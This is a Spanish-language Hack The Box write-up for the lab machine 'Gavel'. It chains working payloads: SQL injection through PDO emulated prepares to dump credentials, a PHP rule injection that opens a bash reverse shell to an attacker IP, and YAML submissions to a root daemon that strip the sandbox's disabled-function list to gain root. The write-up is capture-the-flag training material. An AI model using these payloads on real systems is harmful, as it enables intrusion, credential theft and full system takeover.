# HTB - Gavel Writeup

**Autor:** TRNNSK
**Dificultad:** Medium
**Sistema:** Linux

---

# Resumen

La máquina **Gavel** presenta una cadena de vulnerabilidades que debemos escalar para llegar al control total de root. Vamos a explotar un `.git` expuesto para obtener el código fuente, luego abusar de una vulnerabilidad de SQL injection en PDO statements para extraer credenciales de la base de datos, acceder al panel de administración e inyectar código PHP malicioso en las reglas de subasta para obtener RCE. Para escalar privilegios, abusamos de un daemon root que procesa archivos YAML con código PHP en un entorno sandbox, modificando la configuración del sandbox para habilitar funciones peligrosas.

---

# Enumeración

## Escaneo inicial

```bash
ports=$(nmap --open 10.129.42.228 | grep open | cut -d ' ' -f 1 | cut -d '/' -f 1 | paste -sd,)
nmap 10.129.42.228 -p $ports -sV -sC -Pn --disable-arp-ping
```

### Resultados:

```
22/tcp open  ssh     OpenSSH 8.9p1
80/tcp open  http    Apache httpd 2.4.52
```

---

# Análisis Web

Al acceder al puerto 80 se redirige a `gavel.htb`. Se agrega al `/etc/hosts` y se visita la aplicación — una plataforma de subastas.

Con ffuf se enumera el directorio raíz:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://gavel.htb/FUZZ
```

Se encuentra un directorio `.git` expuesto. Se usa `git-dumper` para extraer el código fuente:

```bash
python3 /opt/git-dumper/git_dumper.py http://gavel.htb/.git/ git
```

---

# Vulnerabilidad: SQL Injection via PDO Emulated Prepares

## Identificación

Revisando el código fuente de `inventory.php`, se identifica una vulnerabilidad en el uso de PDO con `ATTR_EMULATE_PREPARES` habilitado por defecto. La query vulnerable es:

```php
$stmt = $pdo->prepare("SELECT $col FROM inventory WHERE user_id = ? ORDER BY item_name ASC");
$stmt->execute([$userId]);
```

El parámetro `user_id` enviado en el POST de `inventory.php` es el punto de inyección. Cuando se pasa una cadena que contiene un backtick con un null byte (`?%00`), el lexer de PDO interpreta el `?` como un token de bind posicional, permitiendo inyectar una segunda query.

## Explotación

Primero se registra un usuario, se hace login y se puja por un ítem para tener inventario. Luego se intercepta el POST a `inventory.php` con Burp y se inyecta en `user_id`:

### Paso 1 — Listar tablas

```
user_id=item_name`%20FROM%20(SELECT%20table_name%20AS%20`%27item_name`%20from%20information_schema.tables)y;--&sort=\?--%00
```

Se identifican las tablas `auctions`, `inventory`, `items` y `users`.

### Paso 2 — Extraer credenciales

```
user_id=item_name`%20FROM%20(SELECT%20CONCAT_WS(0x3a,%20id,%20username,%20password)%20AS%20`%27item_name`%20from%20users)y;--&sort=\?--%00
```

Se obtiene el hash bcrypt del usuario `auctioneer`:
```
$2y$10$MNkDHV6g16FjW/lAQRpLiuQXN4MVkdMuILn0pLQlC2So9SgH5RTfS
```

### Paso 3 — Crackear el hash

```bash
hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt
# Resultado: midnight1
```

---

# Foothold — PHP Code Injection via Auction Rules

## Identificación

Al entrar como `auctioneer:midnight1` se accede al panel de administración. Revisando el código fuente de `bid_handler.php`, se confirma que las reglas de subasta son expresiones PHP evaluadas dinámicamente con `runkit_function_add()`:

```php
runkit_function_add('ruleCheck', '$current_bid, $previous_bid, $bidder', $rule);
$allowed = ruleCheck($current_bid, $previous_bid, $bidder);
```

Como el panel admin permite editar las reglas de cada ítem, podemos inyectar código PHP malicioso.

## Explotación

**Paso 1 — Listener:**
```bash
nc -lvnp 9090
```

**Paso 2 — Editar la regla del ítem en el Admin Panel:**
```php
system("bash -c 'bash -i >& /dev/tcp/TU_IP/9090 0>&1'"); return true;
```

**Paso 3 — Hacer una puja en ese ítem desde la página de Bidding.**

Al procesarse la puja, la regla maliciosa se evalúa y el reverse shell se ejecuta como `www-data`.

---

# Lateral Movement — www-data → auctioneer

Desde la shell de `www-data`, se prueba reutilización de contraseña:

```bash
su auctioneer
# contraseña: midnight1
```

Flag de usuario:
```bash
cat /home/auctioneer/user.txt
```

---

# Escalada de Privilegios — YAML RCE via gaveld daemon

## Identificación

El usuario `auctioneer` pertenece al grupo `gavel-seller`:

```bash
id
# groups=1002(auctioneer),1001(gavel-seller)
```

Este grupo tiene acceso a:
- `/usr/local/bin/gavel-util` — cliente para interactuar con el daemon
- `/run/gaveld.sock` — socket del daemon

En `/opt/gavel/` se encuentra el binario `gaveld` que corre como **root**:

```bash
ps aux | grep gavel
# root 1048 /opt/gavel/gaveld
```

Analizando `gaveld` con Ghidra, se identifica la función `php_safe_run` que evalúa las reglas PHP en un sandbox usando `/opt/gavel/.config/php/php.ini` como configuración. El path del php.ini se carga desde la variable `RULE_PATH`.

El php.ini del sandbox tiene `disable_functions` con todas las funciones peligrosas:
```
disable_functions=exec,shell_exec,system,passthru,popen,...
```

## Explotación

El ataque se realiza en dos pasos via dos YAMLs separados.

### Paso 1 — YAML que modifica php.ini para habilitar funciones peligrosas

```bash
cat > step1.yaml << 'EOF'
---
name: Step1
description: Fix php.ini
image: test.png
price: 1
rule_path: /home/auctioneer/php.ini
rule_msg: "fixing"
rule: |
  file_put_contents('/home/auctioneer/php.ini', str_replace('disable_functions=exec,shell_exec,system,passthru,popen,proc_open,proc_close,pcntl_exec,pcntl_fork,dl,ini_set,eval,assert,create_function,preg_replace,unserialize,extract,file_get_contents,fopen,include,require,require_once,include_once,fsockopen,pfsockopen,stream_socket_client', 'disable_functions=', file_get_contents('/opt/gavel/.config/php/php.ini')));
  return true;
EOF

gavel-util submit step1.yaml
```

### Paso 2 — YAML con el payload malicioso usando el php.ini modificado

```bash
cat > step2.yaml << 'EOF'
---
name: Exploit
description: Exploiting
image: test.png
price: 1
rule_path: /home/auctioneer/php.ini
rule_msg: "Exploiting"
rule: |
  system('cat /root/root.txt > /home/auctioneer/root.txt');
  return true;
EOF

gavel-util submit step2.yaml
```

Después de unos segundos el daemon procesa el YAML y ejecuta el comando como root.

```bash
cat /home/auctioneer/root.txt
```

---

# TLDR MUCHO TEXTO

1. Escanear con Nmap
2. Enumerar directorios con ffuf — encontrar `.git` expuesto
3. Extraer código fuente con git-dumper
4. Registrar usuario, hacer login y puja para tener inventario
5. Interceptar POST a `inventory.php` con Burp y explotar SQL injection via PDO emulated prepares
6. Extraer hash bcrypt del usuario `auctioneer` y crackearlo con hashcat (`midnight1`)
7. Login como `auctioneer` en el panel admin
8. Inyectar código PHP malicioso en la regla de un ítem del Admin Panel
9. Hacer puja en ese ítem para disparar la evaluación del payload y obtener reverse shell como `www-data`
10. Escalar a `auctioneer` por reutilización de contraseña
11. Identificar el daemon `gaveld` corriendo como root con `gavel-util`
12. Enviar primer YAML para modificar `php.ini` y habilitar funciones peligrosas
13. Enviar segundo YAML con payload malicioso apuntando al `php.ini` modificado
14. Leer la flag de root copiada a `/home/auctioneer/root.txt`

---

# Conclusión

Esta máquina demuestra cómo:

- Un directorio `.git` expuesto permite obtener el código fuente completo de la aplicación
- El uso incorrecto de PDO con `ATTR_EMULATE_PREPARES` activo permite SQL injection via null bytes en backtick identifiers
- La evaluación dinámica de código PHP sin sanitización en reglas de negocio permite RCE autenticado
- Los daemons root que procesan archivos de usuario pueden ser abusados si el sandbox PHP es configurable desde el usuario
- La reutilización de contraseñas entre la base de datos y el sistema operativo es un vector de escalada lateral frecuente

---

y ya
